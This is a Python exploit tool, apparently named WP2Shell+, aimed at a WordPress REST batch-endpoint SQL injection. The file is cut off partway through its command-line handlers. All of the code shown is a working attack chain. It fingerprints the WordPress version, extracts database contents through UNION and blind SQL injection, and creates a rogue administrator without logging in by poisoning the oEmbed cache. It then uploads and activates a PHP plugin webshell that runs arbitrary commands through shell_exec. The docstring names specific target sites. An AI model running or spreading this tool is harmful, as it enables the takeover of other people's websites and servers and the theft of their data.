#!/usr/bin/env python3
"""WP2Shell+ — 0xsha enhanced with timing fallback + widgets UNION fallback + auto-detect
Works on ALL target types: fisip, ppg, si.unsada, etc.

Commands:
  check <url>              — detect + confirm vuln (boolean OR timing)
  read <url> [SQL]         — extract data (UNION in-band OR blind)
  shell <url> -c "cmd"     — full chain: create admin + deploy shell + RCE
"""
from __future__ import annotations
import argparse, hashlib, io, json, os, re, secrets, ssl, sys, time, urllib.error, urllib.parse, urllib.request, uuid, zipfile, statistics
from dataclasses import dataclass, field
import http.cookiejar
from http.cookiejar import CookieJar
from typing import Any, Callable, Dict, List, Optional, Tuple

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
_PRIMER = {"method": "POST", "path": "///"}
_PRIMER_ALT = {"method": "GET", "path": "http://:"}
_ITEM_ROUTE = "/wp/v2/posts/999999"
_MIN, _MAX = 32, 126
_OEMBED_SIZE = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
_POST_DATE = "2020-01-01 00:00:00"

# Version intel
_FULL_CHAIN = {(6,9,n) for n in range(0,5)} | {(7,0,0),(7,0,1)}
_PATCHED = {(6,8,6),(6,9,5),(7,0,2),(7,1,0)}

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

@dataclass
class Response:
    status: int; elapsed: float; body: str
    def json(self): return json.loads(self.body)

class TargetError(Exception): pass

# ── BatchClient ──────────────────────────────────────────────
class BatchClient:
    def __init__(self, base_url, *, timeout=30.0, insecure=True):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.rest_route = None  # auto-detect
        handlers = []
        if insecure:
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        self._opener = urllib.request.build_opener(*handlers)

    def _endpoint(self, rr):
        return f"{self.base_url}/?rest_route=/batch/v1" if rr else f"{self.base_url}/wp-json/batch/v1"

    def resolve(self):
        if self.rest_route is not None:
            return self._endpoint(self.rest_route)
        for rr in (False, True):
            try:
                r = self._raw_post(self._endpoint(rr), {"requests": []})
                if r.status == 207:
                    self.rest_route = rr
                    return self._endpoint(rr)
            except Exception: continue
        self.rest_route = False
        return self._endpoint(False)

    @property
    def endpoint(self): return self.resolve()

    def _raw_post(self, url, payload):
        req = urllib.request.Request(url, data=json.dumps(payload).encode(), method="POST",
            headers={"Content-Type":"application/json","User-Agent":UA})
        start = time.monotonic()
        try:
            r = self._opener.open(req, timeout=self.timeout)
            return Response(r.status, time.monotonic()-start, r.read().decode("utf-8","replace"))
        except urllib.error.HTTPError as e:
            return Response(e.code, time.monotonic()-start, e.read().decode("utf-8","replace"))
        except OSError as e:
            raise TargetError(f"cannot reach {url}: {e}")

    def post(self, payload): return self._raw_post(self.endpoint, payload)
    def probe(self): return self.post({"requests": []})

    # ── Blind injection (timing + boolean) ──
    def inject(self, author_not_in):
        """Inner: primer → /wp/v2/users?author_exclude=... → /wp/v2/posts
        Outer: primer → POST /wp/v2/posts {body: inner} → POST /batch/v1 {body:[]}
        """
        enc = urllib.parse.quote(author_not_in, safe="")
        inner = {"requests": [_PRIMER,
            {"method":"GET","path":f"/wp/v2/users?author_exclude={enc}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        return self.post({"requests": [_PRIMER,
            {"method":"POST","path":"/wp/v2/posts","body":inner},
            {"method":"POST","path":"/batch/v1","body":{"requests":[]}}]})

    def inject_alt(self, author_not_in):
        """Alternative inner: GET http://: primer (old backup style)
        """
        enc = urllib.parse.quote(author_not_in, safe="")
        inner = {"requests": [_PRIMER_ALT,
            {"method":"GET","path":f"/wp/v2/categories?author_exclude={enc}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        return self.post({"requests": [_PRIMER,
            {"method":"POST","path":"/wp/v2/posts","body":inner},
            {"method":"POST","path":"/batch/v1","body":{"requests":[]}}]})

    # ── X-WP-Total boolean oracle ──
    def match_count(self, resp):
        try:
            inner = resp.json()["responses"][1]["body"]
            headers = inner["responses"][1]["headers"]
            return int(headers.get("X-WP-Total"))
        except: return None

    def rows(self, resp):
        try:
            inner = resp.json()["responses"][1]["body"]
            result = inner["responses"][1]["body"]
            return result if isinstance(result, list) else None
        except: return None

    # ── UNION injection (item route + widgets fallback) ──
    def union_inject_item(self, author_not_in):
        """Item route: /wp/v2/posts/999999 — Icex0 style"""
        q = urllib.parse.urlencode({"author_exclude":author_not_in,"orderby":"none","per_page":"500"})
        inner = {"requests": [_PRIMER,
            {"method":"GET","path":f"{_ITEM_ROUTE}?{q}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        return self.post({"requests": [_PRIMER,
            {"method":"POST","path":"/wp/v2/posts","body":inner},
            {"method":"POST","path":"/batch/v1","body":{"requests":[]}}]})

    def union_inject_widgets(self, author_not_in):
        """Widgets route: /wp/v2/widgets — old backup style"""
        q = urllib.parse.urlencode({"author_exclude":author_not_in,"per_page":"-1","orderby":"none","context":"view"})
        inner = {"requests": [_PRIMER_ALT,
            {"method":"GET","path":f"/wp/v2/widgets?{q}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        return self.post({"requests": [_PRIMER,
            {"method":"POST","path":"/wp/v2/posts","body":inner},
            {"method":"POST","path":"/batch/v1","body":{"requests":[]}}]})

    def union_inject(self, author_not_in):
        """Try item route first, widgets fallback"""
        r = self.union_inject_item(author_not_in)
        # Check if response has forged post data
        if r and r.status < 400:
            return r
        return self.union_inject_widgets(author_not_in)

# ── Timing oracle (derived table SLEEP — fires ONCE) ──
class TimingOracle:
    def __init__(self, client, sleep=3.0):
        self.client = client
        self.sleep = sleep
        self.threshold = None
        self.requests = 0

    def calibrate(self):
        """Adaptive calibration using derived table SLEEP"""
        delay = self.sleep
        for _ in range(3):
            fast = [self._elapsed("SLEEP(0)", delay) for _ in range(5)]
            slow = [self._elapsed(f"SLEEP({delay:g})", delay) for _ in range(3)]
            fm, sm = statistics.median(fast), statistics.median(slow)
            jitter = statistics.median(abs(s-fm) for s in fast)
            if sm - fm > max(0.06, jitter*8):
                self.sleep = delay
                self.threshold = (fm+sm)/2
                return fm, sm
            delay *= 2
        return None, None

    def _elapsed(self, sql, timeout_extra=0):
        self.requests += 1
        old = self.client.timeout
        self.client.timeout = max(old, self.sleep + 10)
        try:
            r = self.client.inject(f"0) AND (SELECT 1 FROM (SELECT {sql})_z)-- -")
            return r.elapsed
        finally:
            self.client.timeout = old

    def true(self, cond):
        """Timing-based TRUE if condition holds (derived table SLEEP)"""
        self.requests += 1
        old = self.client.timeout
        self.client.timeout = max(old, self.sleep + 10)
        try:
            base = self.client.inject(f"0) AND (SELECT 1 FROM (SELECT SLEEP(0))_z)-- -").elapsed
            delayed = self.client.inject(f"0) AND (SELECT 1 FROM (SELECT IF(({cond}),SLEEP({self.sleep:g}),0))_z)-- -").elapsed
            return delayed - base >= self.sleep * 0.5
        finally:
            self.client.timeout = old

# ── Blind SQLi (boolean primary, timing fallback) ──
class BlindSQLi:
    def __init__(self, client, *, sleep=3.0):
        self.client = client
        self.sleep = sleep
        self.requests = 0
        self._mode = None  # "boolean" or "timing"
        self._timing = None

    def _detect_mode(self):
        """Detect if boolean oracle works, fall back to timing"""
        # Try boolean: does 1=1 return rows?
        r = self.client.inject("0) AND (1=1)-- -")
        count = self.client.match_count(r)
        if count is not None and count > 0:
            # Verify 1=0 returns 0
            r2 = self.client.inject("0) AND (1=0)-- -")
            count2 = self.client.match_count(r2)
            if count2 is not None and count2 == 0:
                self._mode = "boolean"
                return
        # Fallback: timing
        self._timing = TimingOracle(self.client, self.sleep)
        fm, sm = self._timing.calibrate()
        if fm is not None and sm - fm >= 1.0:
            self._mode = "timing"
            return
        # Last resort: try alt injection route
        r = self.client.inject_alt("0) AND (1=1)-- -")
        count = self.client.match_count(r)
        if count is not None and count > 0:
            self._mode = "boolean_alt"
            return
        self._mode = "timing"
        self._timing = TimingOracle(self.client, self.sleep)
        self._timing.calibrate()

    def confirm(self):
        self._detect_mode()
        return self._mode is not None

    def _true(self, cond):
        self.requests += 1
        if self._mode == "boolean":
            count = self.client.match_count(self.client.inject(f"0) AND ({cond})-- -"))
            return count is not None and count > 0
        elif self._mode == "boolean_alt":
            count = self.client.match_count(self.client.inject_alt(f"0) AND ({cond})-- -"))
            return count is not None and count > 0
        else:
            return self._timing.true(cond)

    def extract(self, expr, *, max_length=128, on_char=None):
        chars = []
        for pos in range(1, max_length+1):
            probe = f"ASCII(SUBSTRING(COALESCE(({expr}),''),{pos},1))"
            if not self._true(f"{probe} > 0"): break
            lo, hi = _MIN, _MAX
            while lo < hi:
                mid = (lo+hi)//2
                if self._true(f"{probe} > {mid}"): lo = mid+1
                else: hi = mid
            chars.append(chr(lo))
            if on_char: on_char("".join(chars))
        return "".join(chars)

    def integer(self, expr):
        t = self.extract(expr).strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected int from {expr!r}, got {t!r}")
        return int(t)

# ── UNION in-band extractor ──
class UnionSQLi:
    _COLUMNS = 23; _TITLE_COL = 6
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    _PUBLISH = "0x7075626c697368"; _POST = "0x706f7374"
    _DATE = "0x323032302d30312d30312030303a30303a3030"

    def __init__(self, client):
        self.client = client
        self.requests = 0
        self._route = None  # "item" or "widgets"

    def available(self):
        for route_name, method in [("item", self.client.union_inject_item), ("widgets", self.client.union_inject_widgets)]:
            for fmt in ["1) AND 1=0 UNION ALL SELECT %s -- -", "0) UNION SELECT %s -- -"]:
                try:
                    payload = fmt % self._columns("SELECT 0x4f4b")
                    r = method(payload)
                    if r and r.status < 400:
                        m = self._RE.search(r.body)
                        if m and bytes.fromhex(m.group(1)).decode("utf-8","replace") == "OK":
                            self._route = route_name
                            return True
                except: continue
        return False

    def extract(self, expr):
        return self._read(expr) or ""

    def integer(self, expr):
        t = (self._read(f"SELECT ({expr})") or "").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected int from {expr!r}, got {t!r}")
        return int(t)

    def _read(self, expr):
        self.requests += 1
        for fmt in ["1) AND 1=0 UNION ALL SELECT %s -- -", "0) UNION SELECT %s -- -"]:
            payload = fmt % self._columns(expr)
            if self._route == "widgets":
                r = self.client.union_inject_widgets(payload)
            else:
                r = self.client.union_inject_item(payload)
            m = self._RE.search(r.body) if r else None
            if m:
                digits = m.group(1)
                if len(digits)%2: digits = digits[:-1]
                try: return bytes.fromhex(digits).decode("utf-8","replace")
                except: pass
        return None

    def _columns(self, expr):
        cols = []
        for i in range(1, self._COLUMNS+1):
            if i==1: cols.append("999999")
            elif i in (3,4,15,16): cols.append(self._DATE)
            elif i==self._TITLE_COL: cols.append(f"CONCAT(0x7c7c,HEX(CAST(({expr})AS CHAR)),0x7c7c)")
            elif i==8: cols.append(self._PUBLISH)
            elif i==21: cols.append(self._POST)
            else: cols.append(str(i))
        return ",".join(cols)

# ── Helpers ──
def mysql_hex(text):
    return f"0x{text.encode().hex()}" if text else "''"

def wp_posts_tuple(row_id, *, body="", title="", status="publish", slug="", parent=0, kind="post", author=1):
    cols = [str(row_id), str(author), mysql_hex(_POST_DATE), mysql_hex(_POST_DATE), mysql_hex(body),
            mysql_hex(title), "''", mysql_hex(status), mysql_hex("closed"), mysql_hex("closed"), "''",
            mysql_hex(slug), "''", "''", mysql_hex(_POST_DATE), mysql_hex(_POST_DATE), "''", str(parent),
            "''", "0", mysql_hex(kind), "''", "0"]
    return ",".join(cols)

def detect_version(base):
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    for path in ("wp-json/", "?rest_route=/"):
        try:
            r = opener.open(urllib.request.Request(f"{base.rstrip('/')}/{path}", headers={"User-Agent":UA}), timeout=15)
            body = r.read().decode("utf-8","replace")
            for m in re.finditer(r'"generator":"[^"]*?(\d+\.\d+(?:\.\d+)?)"', body):
                parts = [int(x) for x in m.group(1).split(".")[:3]]
                while len(parts)<3: parts.append(0)
                return tuple(parts)
        except: pass
    # feed
    for path in ("feed/", "feed/rss2/"):
        try:
            r = opener.open(urllib.request.Request(f"{base.rstrip('/')}/{path}", headers={"User-Agent":UA}), timeout=15)
            for m in re.finditer(r"[?&]v=(\d+\.\d+(?:\.\d+)?)", r.read().decode("utf-8","replace")):
                parts = [int(x) for x in m.group(1).split(".")[:3]]
                while len(parts)<3: parts.append(0)
                return tuple(parts)
        except: pass
    # generator meta
    try:
        r = opener.open(urllib.request.Request(f"{base.rstrip('/')}/", headers={"User-Agent":UA}), timeout=15)
        m = re.search(r'name=["\']generator["\'][^>]*content=["\']WordPress\s+(\d+\.\d+(?:\.\d+)?)', r.read().decode("utf-8","replace"))
        if m:
            parts = [int(x) for x in m.group(1).split(".")[:3]]
            while len(parts)<3: parts.append(0)
            return tuple(parts)
    except: pass
    return None

def classify(v):
    if v is None: return "unknown"
    vs = ".".join(map(str,v))
    if v in _PATCHED or v > (7,0,2): return f"{vs} (patched)"
    if v in _FULL_CHAIN: return f"{vs} VULNERABLE"
    return f"{vs} (out of range)"

# ── Pre-auth admin creator ──
@dataclass
class CreatedAdmin:
    username: str; password: str; email: str; source_admin_id: int; table_prefix: str

@dataclass
class PoisonGraph:
    cache_post_ids: List[int]; source_admin_id: int
    def __post_init__(self):
        self.outer_id = 1800000000 + secrets.randbelow(100000000)
        self.nav_item_id = self.outer_id + 1
        self.inner_id = self.outer_id + 2
        self.changeset_id, self.cache_id, self.request_id = self.cache_post_ids
    def rows(self, changeset, trigger_url):
        return [
            wp_posts_tuple(0, body=f'[embed width="500" height="750"]{trigger_url}[/embed]', title="trigger", slug="trigger"),
            wp_posts_tuple(self.changeset_id, body=changeset, title="changeset", status="future", slug=str(uuid.uuid4()), parent=self.outer_id, kind="customize_changeset"),
            wp_posts_tuple(self.outer_id, body="outer", title="outer", status="draft", slug="outer", parent=self.changeset_id),
            wp_posts_tuple(self.cache_id, title="cache", slug="cache", parent=self.changeset_id),
            wp_posts_tuple(self.nav_item_id, body="nav", title="nav", slug="nav", parent=self.request_id, kind="nav_menu_item"),
            wp_posts_tuple(self.request_id, body="parse", title="parse", status="parse", slug="parse", parent=self.inner_id, kind="request"),
            wp_posts_tuple(self.inner_id, body="inner", title="inner", status="draft", slug="inner", parent=self.request_id),
        ]

class PreAuthAdminCreator:
    def __init__(self, base_url, *, timeout=30.0, sleep=5.0):
        self.base_url = base_url.rstrip("/")
        self.client = BatchClient(base_url, timeout=timeout)
        self.sleep = sleep

    def create_admin(self):
        # Try UNION first (fastest), fall back to blind
        sqli_u = UnionSQLi(self.client)
        use_union = sqli_u.available()
        if use_union:
            print(f"[+] UNION available via {sqli_u._route} route", flush=True)
            return self._create_via_union(sqli_u)
        else:
            print("[*] UNION not available, using blind SQLi (slower)", flush=True)
            sqli_b = BlindSQLi(self.client, sleep=self.sleep)
            if not sqli_b.confirm():
                raise RuntimeError("neither UNION nor blind SQLi available")
            print(f"[+] Blind SQLi mode: {sqli_b._mode}", flush=True)
            return self._create_via_blind(sqli_b, sqli_u)

    def _create_via_union(self, sqli):
        nonce = secrets.token_hex(6)
        embeds = self._embed_urls(nonce)
        if os.environ.get("WP2DEBUG"): print(f"[D] embeds: {embeds}", flush=True)
        self._prime_oembed(embeds, union_route=sqli._route)
        posts_table = sqli.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            # DATABASE() might be NULL — try without schema filter
            posts_table = sqli.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE RIGHT(TABLE_NAME,6)=0x5f706f737473 AND TABLE_SCHEMA NOT IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x737973) ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError(f"posts table extraction failed: {posts_table!r}")
        prefix = posts_table[:-5]
        if os.environ.get("WP2DEBUG"): print(f"[D] posts_table={posts_table} prefix={prefix}", flush=True)
        admin_id = sqli.integer(f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key={mysql_hex(prefix+'capabilities')} AND INSTR(m.meta_value,{mysql_hex('s:13:\"administrator\";b:1;')})>0 ORDER BY u.ID LIMIT 1")
        if os.environ.get("WP2DEBUG"): print(f"[D] admin_id={admin_id}", flush=True)
        if admin_id < 1: raise RuntimeError("no admin found")
        backing = self._oembed_ids(sqli, posts_table, embeds)
        if os.environ.get("WP2DEBUG"): print(f"[D] backing (cache IDs)={backing}", flush=True)
        _clean_user = os.environ.get("WP2USER","")
        _clean_email = os.environ.get("WP2EMAIL","")
        _clean_pass = os.environ.get("WP2PASS","")
        if _clean_user and _clean_email:
            username = _clean_user; email = _clean_email; password = _clean_pass or f"Wp2!{secrets.token_urlsafe(15)}"
        else:
            username = f"wp2{nonce}"; password = f"Wp2!{secrets.token_urlsafe(15)}"; email = f"{username}@wp2shell.invalid"
        self._escalate(backing, embeds, admin_id, {"username":username,"password":password,"email":email,"roles":["administrator"]}, union_route=sqli._route)
        return CreatedAdmin(username, password, email, admin_id, prefix)

    def _create_via_blind(self, sqli_b, sqli_u):
        nonce = secrets.token_hex(6)
        embeds = self._embed_urls(nonce)
        self._prime_oembed(embeds)
        # Try INFORMATION_SCHEMA first
        posts_table = sqli_b.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            # DATABASE() NULL in subquery — try WITHOUT schema filter
            posts_table = sqli_b.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME) LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            # Last resort: brute force common prefixes
            for prefix in ["wp_", "wp_1_", "wp_2_", "wp_3_", "wordpress_", "wp_5_", "wp_4_"]:
                table = f"{prefix}posts"
                try:
                    cnt = sqli_b.integer(f"SELECT COUNT(*) FROM `{table}`")
                    if cnt >= 0:
                        posts_table = table
                        print(f"[+] Found prefix via brute force: {prefix} (count={cnt})", flush=True)
                        break
                except:
                    continue
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError(f"posts table extraction failed: {posts_table!r}")
        prefix = posts_table[:-5]
        admin_id = sqli_b.integer(f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID WHERE m.meta_key={mysql_hex(prefix+'capabilities')} AND INSTR(m.meta_value,{mysql_hex('s:13:\"administrator\";b:1;')})>0 ORDER BY u.ID LIMIT 1")
        if admin_id < 1: raise RuntimeError("no admin found")
        backing = []
        for u in embeds:
            ck = hashlib.md5((u+_OEMBED_SIZE).encode()).hexdigest()
            pid = sqli_b.integer(f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 AND post_name=0x{ck.encode().hex()} ORDER BY ID DESC LIMIT 1")
            backing.append(pid)
        if any(i<1 for i in backing) or len(set(backing))!=3:
            raise RuntimeError(f"oEmbed cache IDs failed: {backing}")
        _clean_user = os.environ.get("WP2USER","")
        _clean_email = os.environ.get("WP2EMAIL","")
        _clean_pass = os.environ.get("WP2PASS","")
        if _clean_user and _clean_email:
            username = _clean_user; email = _clean_email; password = _clean_pass or f"Wp2!{secrets.token_urlsafe(15)}"
        else:
            username = f"wp2{nonce}"; password = f"Wp2!{secrets.token_urlsafe(15)}"; email = f"{username}@wp2shell.invalid"
        self._escalate(backing, embeds, admin_id, {"username":username,"password":password,"email":email,"roles":["administrator"]})
        return CreatedAdmin(username, password, email, admin_id, prefix)

    def _embed_urls(self, nonce):
        base_host = urllib.parse.urlsplit(self.base_url).netloc.lower().replace("www.","")
        candidates = []
        for path_fn in (lambda r: f"{self.base_url}/?rest_route={r}&per_page=5&_fields=link",
                       lambda r: f"{self.base_url}/wp-json{r}?per_page=5&_fields=link"):
            for route in ("/wp/v2/posts", "/wp/v2/pages"):
                try:
                    url = path_fn(route)
                    r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent":UA}), timeout=15, context=ctx)
                    items = json.loads(r.read())
                    for item in items:
                        link = item.get("link")
                        if not link: continue
                        s = urllib.parse.urlsplit(link)
                        # Prefer links matching base_url domain
                        if base_host in s.netloc.lower().replace("www.",""):
                            return [urllib.parse.urlunsplit((s.scheme,s.netloc,s.path,s.query,f"{nonce}{i}")) for i in range(3)]
                        candidates.append(s)
                except: continue
        # Fallback: use first candidate even if domain mismatch
        if candidates:
            s = candidates[0]
            return [urllib.parse.urlunsplit((s.scheme,s.netloc,s.path,s.query,f"{nonce}{i}")) for i in range(3)]
        raise RuntimeError("no public post/page for oEmbed")

    def _prime_oembed(self, embeds, union_route=None):
        content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embeds)
        row = wp_posts_tuple(0, body=content, title="seed", slug="seed")
        payload = f"1) AND 1=0 UNION ALL SELECT {row} -- -"
        # Try item route with context=view first (renders shortcodes), then widgets fallback
        routes_tried = []
        # Item route + context=view
        q1 = urllib.parse.urlencode({"author_exclude":payload,"orderby":"none","per_page":"500","context":"view"})
        inner1 = {"requests": [_PRIMER_ALT,
            {"method":"GET","path":f"{_ITEM_ROUTE}?{q1}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        try:
            resp1 = self.client.post({"requests": [
                {"method":"POST","path":"http://:"},
                {"method":"POST","path":"/wp/v2/posts","body":inner1},
                {"method":"POST","path":"/batch/v1"},
            ]})
            routes_tried.append("item+context=view")
            if os.environ.get("WP2DEBUG"): print(f"[D] prime item+view: {resp1.body[:300] if hasattr(resp1,'body') else 'no body'}", flush=True)
        except Exception as e:
            if os.environ.get("WP2DEBUG"): print(f"[D] prime item+view ERR: {e}", flush=True)
        # Widgets route + context=view (official PoC style)
        q2 = urllib.parse.urlencode({"author_exclude":payload,"per_page":"-1","orderby":"none","context":"view"})
        inner2 = {"requests": [_PRIMER_ALT,
            {"method":"GET","path":f"/wp/v2/widgets?{q2}"},
            {"method":"GET","path":"/wp/v2/posts"}]}
        try:
            resp2 = self.client.post({"requests": [
                {"method":"POST","path":"http://:"},
                {"method":"POST","path":"/wp/v2/posts","body":inner2},
                {"method":"POST","path":"/batch/v1"},
            ]})
            routes_tried.append("widgets+context=view")
            if os.environ.get("WP2DEBUG"): print(f"[D] prime widgets+view: {resp2.body[:300] if hasattr(resp2,'body') else 'no body'}", flush=True)
        except Exception as e:
            if os.environ.get("WP2DEBUG"): print(f"[D] prime widgets+view ERR: {e}", flush=True)
        if os.environ.get("WP2DEBUG"): print(f"[D] routes_tried: {routes_tried}", flush=True)
        time.sleep(1)

    def _oembed_ids(self, sqli, posts_table, embeds):
        ids = []
        for u in embeds:
            ck = hashlib.md5((u+_OEMBED_SIZE).encode()).hexdigest()
            if os.environ.get("WP2DEBUG"): print(f"[D] oembed hash for {u[:60]}: {ck}", flush=True)
            ids.append(sqli.integer(f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 AND post_name=0x{ck.encode().hex()} ORDER BY ID DESC LIMIT 1"))
        if os.environ.get("WP2DEBUG"): print(f"[D] oembed_ids result: {ids}", flush=True)
        if any(i<1 for i in ids) or len(set(ids))!=3:
            raise RuntimeError(f"oEmbed cache IDs failed: {ids}")
        return ids

    def _escalate(self, backing, embeds, admin_id, user_body, union_route=None):
        g = PoisonGraph(backing, admin_id)
        changeset = json.dumps({f"nav_menu_item[{g.nav_item_id}]": {"type":"nav_menu_item","user_id":admin_id,"value":{"object_id":0,"object":"","menu_item_parent":0,"position":0,"type":"custom","title":"generated","url":"https://example.invalid/","target":"","attr_title":"","description":"","classes":"","xfn":"","status":"publish","nav_menu_term_id":0,"_invalid":False}}}, separators=(",",":"))
        rows = g.rows(changeset, embeds[1])
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        # Escalation MUST use widgets route + context=view (same as priming)
        q = urllib.parse.urlencode({"author_exclude":union,"per_page":"-1","orderby":"none","context":"view"})
        inner = [_PRIMER_ALT,
            {"method":"GET","path":f"/wp/v2/widgets?{q}"},
            {"method":"GET","path":"/wp/v2/posts"},
            {"method":"POST","path":"/wp/v2/users","body":user_body},
            {"method":"POST","path":"/wp/v2/users","body":user_body}]
        old = self.client.timeout
        self.client.timeout = 60
        try:
            resp = self.client.post({"requests": [
                {"method":"POST","path":"http://:"},
                {"method":"POST","path":"/wp/v2/posts","body":{"requests":inner}},
                {"method":"POST","path":"/batch/v1"},
            ]})
            if os.environ.get("WP2DEBUG"):
                body_str = resp.body[:1000] if hasattr(resp, 'body') else str(resp)[:1000]
                print(f"[D] Escalation response: {body_str}", flush=True)
        except Exception as e:
            if os.environ.get("WP2DEBUG"):
                print(f"[D] Escalation error: {e}", flush=True)
        finally:
            self.client.timeout = old

# ── Admin session + webshell ──
class AdminSession:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self._slug = "wp2shell_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)
        self._jar = CookieJar()
        self._opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx), urllib.request.HTTPCookieProcessor(self._jar))

    def login(self, user, password):
        import time as _time
        self._get("/wp-login.php")
        # Add test cookie via header instead of CookieJar API
        self._post("/wp-login.php", {"log":user,"pwd":password,"wp-submit":"Log In","redirect_to":f"{self.base_url}/wp-admin/","testcookie":"1"},
            {"Cookie": "wordpress_test_cookie=WP+Cookie+check"})
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)

    def deploy_webshell(self):
        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        m = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', page) or re.search(r'_wpnonce["\s]+value="([0-9a-f]+)"', page)
        if not m: raise RuntimeError("nonce not found")
        boundary = "----wp2shell"+uuid.uuid4().hex
        php = f"<?php\n/* Plugin Name: {self._slug} */\nif(hash_equals('{self._token}',(string)($_GET['t']??''))&&isset($_GET['c'])){{echo 'WP2SHELL::'.shell_exec((string)$_GET['c']).'::END';}}\n"
        buf = io.BytesIO()
        with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/{self._slug}.php", php)
        body = b"".join([
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n{m.group(1)}\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wp-admin/plugin-install.php?tab=upload\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"pluginzip\"; filename=\"{self._slug}.zip\"\r\nContent-Type: application/zip\r\n\r\n".encode(),
            buf.getvalue(), f"\r\n--{boundary}--\r\n".encode(),
        ])
        self._post("/wp-admin/update.php?action=upload-plugin", body, {"Content-Type":f"multipart/form-data; boundary={boundary}"})
        # Activate
        page = self._get("/wp-admin/plugins.php")
        m = re.search(rf'href="([^"]*action=activate[^"]*{self._slug}[^"]*)"', page)
        if m:
            self._get(urllib.parse.urljoin(f"{self.base_url}/wp-admin/", urllib.parse.unescape(m.group(1))))
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, path, cmd):
        q = urllib.parse.urlencode({"t":self._token,"c":cmd})
        out = self._get(f"{path}?{q}")
        m = re.search(r"WP2SHELL::(.*?)::END", out, re.S)
        return m.group(1) if m else None

    def _get(self, path):
        req = urllib.request.Request(self.base_url+path, headers={"User-Agent":UA})
        return self._opener.open(req, timeout=30).read().decode("utf-8","replace")
    def _post(self, path, data, headers=None):
        if isinstance(data,dict): data = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(self.base_url+path, data=data, headers={"User-Agent":UA,**(headers or {})})
        try:
            return self._opener.open(req, timeout=30).read().decode("utf-8","replace")
        except urllib.request.HTTPError as e:
            return e.read().decode("utf-8","replace")

# ── CLI ──
def cmd_check(a):
    client = BatchClient(a.url)
    ver = detect_version(a.url)
    print(f"[*] WordPress version: {classify(ver)}")
    try:
        probe = client.probe()
        if probe.status != 207:
            print(f"[-] Batch endpoint HTTP {probe.status} — patched/blocked")
            return 1
        print(f"[+] Batch endpoint reachable (HTTP 207) at {client.endpoint}")
    except TargetError as e:
        print(f"[-] {e}"); return 1
    sqli = BlindSQLi(client, sleep=a.sleep)
    if sqli.confirm():
        print(f"[+] SQL injection CONFIRMED — mode: {sqli._mode}")
        return 0
    print("[-] Not exploitable"); return 2

def cmd_read(a):
    client = BatchClient(a.url)
    sqli_u = UnionSQLi(client)
    if sqli_u.available():
        print(f"[+] UNION available ({sqli_u._route})")
        if a.query:
            print(sqli_u.extract(a.query))
        else:
            for label, expr in (("MySQL ver","SELECT @@version"),("DB user","SELECT CURRENT_USER()"),("DB name","SELECT DATABASE()")):
                print(f"[+] {label}: {sqli_u.extract(expr)}")
    else:
        print("[*] UNION not available, using blind")
        sqli_b = BlindSQLi(client, sleep=a.sleep)
        if not sqli_b.confirm():
            print("[-] No SQLi available"); return 1
        print(f"[+] Blind mode: {sqli_b._mode}")
        expr = a.query or "SELECT DATABASE()"
